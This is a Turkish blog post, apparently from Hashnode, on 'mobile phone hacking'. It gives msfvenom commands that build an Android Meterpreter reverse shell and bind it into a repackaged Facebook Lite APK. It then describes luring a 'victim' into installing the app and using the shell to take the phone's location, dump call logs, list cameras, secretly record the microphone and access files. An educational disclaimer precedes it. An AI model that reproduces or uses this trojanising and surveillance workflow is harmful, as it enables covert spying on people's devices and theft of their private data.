---
title: "Cep Telefonu Hackleme"
seoTitle: "Cep Telefonu Hackleme"
datePublished: Fri May 10 2024 20:32:38 GMT+0000 (Coordinated Universal Time)
cuid: clw14vzq000090algc14kdk0a
slug: cep-telefonu-hackleme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1715372749131/e29786fe-e441-4a8d-9a6b-952ccdf20b56.jpeg
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1715373147992/2bd6f98f-3d10-440a-8ebd-eb56726d8af3.jpeg
tags: developer, hacking, developer-tools, ferdibirgul

---

Yasal Uyarı!

> *“Cep Telefonu Hacking” konulu bu makale yalnızca eğitim amaçlıdır. Herhangi bir yasadışı faaliyeti onaylamıyorum veya teşvik etmiyorum. Tüm gösteriler kontrollü bir ortamda simüle edilmiştir. Mobil cihazlara yetkisiz erişim sağlamaya çalışmayın. Bu bilgileri sorumlu bir şekilde ve risk size ait olmak üzere kullanın.*

Dijital çağda cep telefonları kişisel asistan, iletişim cihazı ve internete açılan kapı olarak hizmet vererek günlük hayatımızın ayrılmaz bir parçası haline geldi. Ancak sundukları kolaylık, güvenlik ihlali riskini de beraberinde getiriyor.

**Cep Telefonu Hacking Nedir?** Bu, mobil cihazlara ve verilere yetkisiz erişim, manipülasyon veya istismar anlamına gelir. Kötü amaçlı yazılım, kimlik avı, ağ saldırıları ve sosyal mühendislik dahil ancak bunlarla sınırlı olmamak üzere bilgisayar korsanları tarafından kullanılan yöntemler de dahil olmak üzere cep telefonu korsanlığının çeşitli yönleri.

* **Kötü Amaçlı Yazılım** : Mobil cihazlar da dahil olmak üzere bilgisayar sistemlerine sızmak, zarar vermek veya bunlara yetkisiz erişim sağlamak için tasarlanmış kötü amaçlı yazılım. Örnekler arasında virüsler, solucanlar, Truva atları ve casus yazılımlar yer alır.
    
* **Kimlik avı** : Elektronik iletişimde güvenilir bir varlık gibi davranarak bireyleri kullanıcı adları, parolalar veya finansal veriler gibi hassas bilgileri ifşa etmeleri için kandırmayı içeren bir siber saldırı yöntemi.
    
* **Ortadaki Adam (MitM) Saldırısı** : Saldırganın iki taraf arasındaki iletişimi onların bilgisi olmadan kestiği ve muhtemelen değiştirdiği bir tür siber saldırıdır. Bu, Wi-Fi bağlantıları da dahil olmak üzere ağ ortamlarında yürütülebilir.
    
* **Sosyal Mühendislik** : Bireylerin gizli bilgileri ifşa edecek şekilde manipüle edilmesi veya güvenliği tehlikeye atacak eylemler gerçekleştirmesi, genellikle teknik araçlar yerine psikolojik manipülasyon yoluyla.
    

**Bu pratik gösteri için, Android** Cihazlara odaklanan Kötü Amaçlı Yazılım ve Kimlik Avı tekniklerinin güçlü kombinasyonunu kullandık . Daha sonra *msfvenom'u* kullanarak kötü amaçlı bir uygulama oluşturacağız ve kurbanı stratejik olarak onu indirip yüklemeye ikna edeceğiz. Bu aldatıcı manevra bize telefonları üzerinde tam erişim ve kontrol sağladı ve bu tür siber tehditlerin kurbanı olmanın ciddi sonuçlarını gösterdi.

## **LABORATUVAR KURULUMU**

Öncelikle kali linux üzerinde Mobile Hacking Lab'ımızı kurmamız gerekiyor.

Android cihazların ve uygulamaların değerlendirmesini yapabilmek için gerçek veya taklit edilmiş bir Android cihazına ihtiyacımız var.

Bu pratik için gerçek bir cihaz kullandık, ancak burada sanal bir Android ortamıyla etkileşim kurmak için eksiksiz bir sensör ve özellikler setine sahip bir Android emülatörü olan [Genymotion'u kuracak bir lonca var.](https://www.genymotion.com/)

Bu uygulamayı doğru bir şekilde indirmek ve kali linux'umuza kurmak için Genymotion indirme sayfasının resmi web sitesini [burada ziyaret ettik.](https://www.genymotion.com/product-desktop/download/)

![](https://miro.medium.com/v2/resize:fit:1050/0*tLPbSv2PDmrSBYZ3 align="left")

Kurulum için dosyayı indirdiğimiz dizine gidip aşağıdaki komutları çalıştırıyoruz.

![](https://miro.medium.com/v2/resize:fit:1050/0*paP4Njrr7m0Yu3hy align="left")

Bu dizini sisteminizde çalıştırıp not alın.

![](https://miro.medium.com/v2/resize:fit:1050/0*b3vXeOj4SW2zEUtx align="left")

Ayrıca virtualbox ve adb'yi de kuruyoruz

![](https://miro.medium.com/v2/resize:fit:1050/0*hr1ufTWuF8MVbP8g align="left")

Genymotion'u çalıştırmak için yukarıda vurgulanan dizine gidiyoruz.

![](https://miro.medium.com/v2/resize:fit:1050/0*aZpmHjomUEBixCEB align="left")

Ve çalıştırın, uygulama açılmalıdır.

![](https://miro.medium.com/v2/resize:fit:1050/0*-6lADm0p2vRZRctF align="left")

Buraya tıklayarak bir hesap oluşturduk.

![](https://miro.medium.com/v2/resize:fit:1050/0*YiuN97EAkHsBR1bd align="left")

Bu sayfaya yönlendirildik.

![](https://miro.medium.com/v2/resize:fit:1050/0*_nuSyZoRYf7_fws9 align="left")

Daha sonra giriş yapıyoruz bu seçenekleri seçin

![](https://miro.medium.com/v2/resize:fit:1050/0*pQ5w19rFaoodVK-X align="left")

Nihayet çalışır durumda

![](https://miro.medium.com/v2/resize:fit:1050/0*n1CmrflFonIo1YC- align="left")

Şimdi bir cihaz ekleyelim

![](https://miro.medium.com/v2/resize:fit:1050/0*l-JQOfwIwA-5Dm1H align="left")

![](https://miro.medium.com/v2/resize:fit:1050/0*xdo9n3SLj-ofGj_2 align="left")

Tamamı boyunca ileri'ye tıklayın

![](https://miro.medium.com/v2/resize:fit:1050/0*kNA8vAIBWbgu3V7w align="left")

Düzenlemek

![](https://miro.medium.com/v2/resize:fit:1050/0*ci6I-FXvbpLcFE2H align="left")

![](https://miro.medium.com/v2/resize:fit:1050/0*MT3uQT4lSrsHiVtT align="left")

Sanal Telefonumuz çalışır durumda.

![](https://miro.medium.com/v2/resize:fit:1050/0*uV_oJ1vKH9xVk24L align="left")

Şimdi tek yapmamız gereken *msfvenom* kullanarak zararlı uygulamamızı oluşturup kurbana göndermek.

## **<mark>Yükümüzü oluşturuyoruz</mark>**

*msfvenom* , yaygın olarak kullanılan bir sızma testi ve yararlanma araç seti olan Metasploit Çerçevesi içindeki güçlü bir araçtır. *msfvenom,* güvenlik profesyonellerinin ve etik korsanların çeşitli istismarlar için özel veriler oluşturmasına olanak tanır. Bu veriler, uzaktan kod yürütme, kabuk erişimi ve daha fazlasını içeren çeşitli platformlar ve amaçlar için oluşturulabilir.

Araç, kullanıcıların veri yükü türlerini, kodlama tekniklerini, çıktı formatlarını ve diğer parametreleri belirlemesine olanak tanıyarak veri yüklerinin oluşturulmasında esneklik sağlar.

*Msfvenom* kullanarak kötü amaçlı bir APK oluşturmak için aşağıdaki komutu kullandık

```plaintext
sudo msfvenom - platform android -a java -p android/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=<Port> -f raw -o zararlı.apk
```

Saldırganın IP'sini alıyoruz

![](https://miro.medium.com/v2/resize:fit:1050/0*pm7o8_sfioI6XdKM align="left")

# **Veri yükümüzü Facebook Lite ile bağlama**

[Facebook Lite APK'sını buradan apkpure'den](https://m.apkpure.com/facebook-lite/com.facebook.lite) indirdim .

![](https://miro.medium.com/v2/resize:fit:1050/0*Y_rwYrj_nukrVRy_ align="left")

![](https://miro.medium.com/v2/resize:fit:1050/0*4U91p6E0nce63NP0 align="left")

APK'yı payload'a bağlamak için aşağıdaki komutu kullanıyoruz

```plaintext
sudo msfvenom --platform android -a java -p android/meterpreter/reverse_tcp -x Facebook_Lite_401.0.0.14.110_Apkpure.apk LHOST=Atacker_IP LPORT=Bağlantı noktası -o kötü niyetliFB.apk
```

![](https://miro.medium.com/v2/resize:fit:1050/0*eC3swk2NnX4U_DcI align="left")

## **Uygulamayı Sunma ve İndirme**

Uygulamayı kurbanımıza göndermek için çeşitli yöntemler kullanabiliriz, burada uygulamaya hizmet etmek için basit bir python http sunucusu kullandık.

![](https://miro.medium.com/v2/resize:fit:1050/0*78Sz4Df5unOzqvXx align="left")

Kötü amaçlı uygulamanın kurbanın tarayıcısı aracılığıyla indirilmesi.

![](https://miro.medium.com/v2/resize:fit:1050/0*bzNcjbwYQVJNVcJV align="left")

Kötü Amaçlı uygulamamız 4 Nisan 2024 itibarıyla tüm Android güvenlik kontrollerinden geçmiştir.

![](https://miro.medium.com/v2/resize:fit:774/0*NMDXc-CT8zgF1Lvk align="left")

# **Mağdurun telefonuna erişim sağlanması**

Bunun için ters kabuk işleyicimizi ve gerekli parametreleri ayarlamak için msfconsole'u kullanacağız.

![](https://miro.medium.com/v2/resize:fit:1050/0*mkydyTdkMuRlXXO4 align="left")

………………………kesinti…………………….

![](https://miro.medium.com/v2/resize:fit:1050/0*tOPUBkMM_znrQziO align="left")

Şimdi Android telefonumuzda MainActivity apk’sına tıklayarak uygulamayı başlatıyoruz.

![](https://miro.medium.com/v2/resize:fit:1050/0*LRYhvlMAv9xlaykf align="left")

Ve bum!!! Kurbanımızın telefonunda ölçüm cihazı kabuğu var!

Çalıştırdığımız işletim sistemi gibi uzak sistem hakkında bilgi almak için;

![](https://miro.medium.com/v2/resize:fit:1050/0*0mSOZqvGvsFN7BL2 align="left")

Kullanıcıya sunucunun biz koşarken çalıştığını göstermek için; *getuid*

![](https://miro.medium.com/v2/resize:fit:1050/0*6_d06L8seAoX9Suw align="left")

Hedefte çalıştırabileceğimiz tüm olası komutları görüntülemek için *yardım* komutunu kullanıyoruz .

![](https://miro.medium.com/v2/resize:fit:1050/0*3uGU6hkUc_OWy_2w align="left")

…………………………..kesinti………………………….

![](https://miro.medium.com/v2/resize:fit:1050/0*vqKGqu4AY1rCuHX9 align="left")

Cihazın rootlu mu yoksa jailbreakli mi olduğunu kontrol etmek için *check\_root komutunu çalıştırıyoruz.*

Ayrıca cihazın mevcut konumunu görüntülemek için *geolocate* komutunu da kullandık.

![](https://miro.medium.com/v2/resize:fit:1050/0*SEZIMwNambPfDPCC align="left")

Kurbanın tüm arama kayıtlarını almak için *dump\_calllog* komutunu kullandık

![](https://miro.medium.com/v2/resize:fit:1050/0*2a3hsaeD58E7gKPp align="left")

![](https://miro.medium.com/v2/resize:fit:1050/0*e4GnBDrK3o7P3WAW align="left")

*Ayrıca, webcam\_list komutunu* çalıştırarak cihazın kaç web kamerasına sahip olduğunu da görebiliriz .

![](https://miro.medium.com/v2/resize:fit:1050/0*vJjTZMXLufHbuRDl align="left")

Kullanıcıyı gizlice dinlemek için de Record\_mic komutunu kullandık.

![](https://miro.medium.com/v2/resize:fit:1050/0*SIcIZRocRdI8Ak6x align="left")

![](https://miro.medium.com/v2/resize:fit:1050/0*K_KgRZA3G6xtO8Qk align="left")

# **Dosya Sistemi Erişimi**

Aşağıda gösterildiği gibi dosya yükleyebileceğimiz, dosya indirebileceğimiz ve dosyaların içeriğini okuyabileceğimiz tam bir dosya sistemimiz var;

![](https://miro.medium.com/v2/resize:fit:1050/0*oJFWefkUDTUhQ3PL align="left")

Ve Bingoooo!!!

Teşekkürler ❤️